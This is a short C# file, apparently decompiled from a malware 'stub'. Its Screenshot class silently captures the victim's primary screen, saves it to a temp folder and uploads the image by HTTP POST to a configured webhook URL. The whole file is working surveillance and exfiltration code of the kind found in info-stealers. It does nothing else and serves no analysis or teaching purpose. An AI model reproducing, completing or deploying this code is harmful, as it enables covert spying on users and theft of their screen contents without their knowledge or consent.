using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Windows.Forms;

namespace Stub
{
	// Token: 0x0200002A RID: 42
	public static class Screenshot
	{
		// Token: 0x0600007A RID: 122 RVA: 0x00006C08 File Offset: 0x00004E08
		public static string CaptureScreen()
		{
			try
			{
				Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
				Rectangle bounds = Screen.AllScreens[0].Bounds;
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
				bitmap.Save(Program.tempFolder + "\\Capture.jpg", ImageFormat.Jpeg);
			}
			catch (Exception value)
			{
				Console.Write(value);
			}
			return Program.tempFolder + "\\Capture.jpg";
		}

		// Token: 0x0600007B RID: 123 RVA: 0x00006CBC File Offset: 0x00004EBC
		public static void SendScreenshot()
		{
			string path = Screenshot.CaptureScreen();
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(path);
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Image.png");
				httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
				httpClient.Dispose();
			}
		}
	}
}
